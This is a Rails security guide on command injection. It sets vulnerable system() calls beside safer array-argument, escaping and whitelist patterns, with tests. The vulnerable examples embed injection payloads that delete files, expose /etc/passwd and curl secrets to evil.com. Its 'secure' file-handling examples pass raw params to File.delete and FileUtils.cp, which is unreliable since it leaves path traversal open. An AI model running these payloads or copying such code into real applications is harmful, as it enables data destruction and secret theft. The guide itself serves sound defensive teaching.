# Command Injection Prevention
# Reference: Rails Security Guide
# Category: CRITICAL SECURITY

# ============================================================================
# ❌ VULNERABLE: String Concatenation in system()
# ============================================================================

# NEVER concatenate user input into system commands
user_input = params[:filename]
system("echo #{user_input}")
# Attack: params[:filename] = "hello; rm -rf /"
# Result: Echoes "hello" AND DELETES ALL FILES

system("convert #{params[:image]} output.jpg")
# Attack: params[:image] = "image.jpg; cat /etc/passwd > public/passwords.txt"
# Result: Exposes system passwords

system("/bin/tar -czf backup.tar.gz #{params[:directory]}")
# Attack: params[:directory] = "/app/data; curl evil.com?data=$(cat config/secrets.yml)"
# Result: Exfiltrates secrets to attacker's server

# ============================================================================
# ✅ SECURE: Array Arguments (Recommended)
# ============================================================================

# Pass command and arguments as separate array elements
system("/bin/echo", user_input)
# Safe: user_input treated as literal argument, not executed
# Input: "hello; rm -rf /"
# Output: "hello; rm -rf /" (printed literally, not executed)

system("convert", params[:image], "output.jpg")
# Safe: params[:image] treated as filename argument only

system("/bin/tar", "-czf", "backup.tar.gz", sanitized_directory)
# Safe: directory name is literal argument

# ============================================================================
# ✅ SECURE: Input Validation + Array Arguments
# ============================================================================

def export_feedback_pdf(feedback_id)
  # Validate input is integer
  id = Integer(feedback_id)

  # Use array form of system
  system("wkhtmltopdf",
         "http://localhost/feedbacks/#{id}",
         "tmp/feedback_#{id}.pdf")
rescue ArgumentError
  raise "Invalid feedback ID"
end

# ============================================================================
# ✅ SECURE: Shellwords for Escaping (When Array Not Possible)
# ============================================================================

require "shellwords"

# Escape user input for shell safety
filename = Shellwords.escape(params[:filename])
system("convert input.jpg #{filename}")
# Shellwords.escape quotes and escapes special characters

# Multiple arguments
args = [params[:input], params[:output]].map { |arg| Shellwords.escape(arg) }.join(" ")
system("convert #{args} -resize 800x600")

# ============================================================================
# ✅ SECURE: Use Ruby Methods Instead of Shell Commands
# ============================================================================

# Instead of shell commands, use Ruby libraries when possible

# ❌ VULNERABLE:
system("rm #{params[:filename]}")

# ✅ SECURE:
File.delete(params[:filename]) if File.exist?(params[:filename])

# ❌ VULNERABLE:
system("mkdir -p #{params[:directory]}")

# ✅ SECURE:
FileUtils.mkdir_p(params[:directory])

# ❌ VULNERABLE:
system("cp #{params[:source]} #{params[:dest]}")

# ✅ SECURE:
FileUtils.cp(params[:source], params[:dest])

# ============================================================================
# ✅ SECURE: Whitelist Valid Values
# ============================================================================

# Only allow predefined values
VALID_FORMATS = %w(pdf png jpg).freeze

def export_feedback(feedback, format)
  unless VALID_FORMATS.include?(format)
    raise ArgumentError, "Invalid format: #{format}"
  end

  # Safe because format is from whitelist
  system("convert", "feedback.html", "output.#{format}")
end

# ============================================================================
# ✅ SECURE: ActiveStorage for File Processing
# ============================================================================

# Use Rails ActiveStorage with variants instead of system commands
class Feedback < ApplicationRecord
  has_one_attached :image

  # Define variants (no user input in commands)
  def thumbnail
    image.variant(resize_to_limit: [100, 100])
  end

  def medium
    image.variant(resize_to_limit: [800, 600])
  end
end

# No shell commands, no injection risk

# ============================================================================
# ✅ SECURE: Background Jobs for System Commands
# ============================================================================

# If you MUST use system commands, isolate in background job with validation
class PdfGenerationJob < ApplicationJob
  queue_as :default

  def perform(feedback_id, output_path)
    feedback = Feedback.find(feedback_id)

    # Validate all inputs
    raise "Invalid path" unless output_path.match?(/\A[\w\-\/]+\.pdf\z/)

    # Use array form
    success = system(
      "wkhtmltopdf",
      "--quiet",
      feedback.public_url,
      output_path
    )

    raise "PDF generation failed" unless success
  end
end

# ============================================================================
# ✅ Testing Command Execution
# ============================================================================

# test/jobs/pdf_generation_job_test.rb
class PdfGenerationJobTest < ActiveJob::TestCase
  test "validates output path" do
    assert_raises(RuntimeError, "Invalid path") do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "../../../etc/passwd")
    end
  end

  test "rejects command injection in path" do
    assert_raises(RuntimeError, "Invalid path") do
      PdfGenerationJob.perform_now(feedbacks(:one).id, "output.pdf; rm -rf /")
    end
  end

  test "generates PDF with safe path" do
    feedback = feedbacks(:one)
    path = "tmp/feedback_#{feedback.id}.pdf"

    PdfGenerationJob.perform_now(feedback.id, path)

    assert File.exist?(path)
  end
end

# ============================================================================
# ⚠️ Dangerous Ruby Methods (Avoid with User Input)
# ============================================================================

# NEVER use these with user input:
eval(params[:code])                    # Code execution
`#{params[:command]}`                  # Shell execution
%x(#{params[:command]})                # Shell execution
system("command #{params[:input]}")    # Shell execution
exec("command #{params[:input]}")      # Shell execution
open("|command #{params[:input]}")     # Shell execution
IO.popen("command #{params[:input]}")  # Shell execution

# ============================================================================
# RULE: NEVER use string interpolation/concatenation in system commands
# ALWAYS: Use array form of system() with separate arguments
# PREFER: Ruby methods over shell commands (File, FileUtils, etc.)
# VALIDATE: Whitelist permitted values when possible
# ESCAPE: Use Shellwords.escape if array form not possible
# ISOLATE: System commands in background jobs with strict validation
# ============================================================================
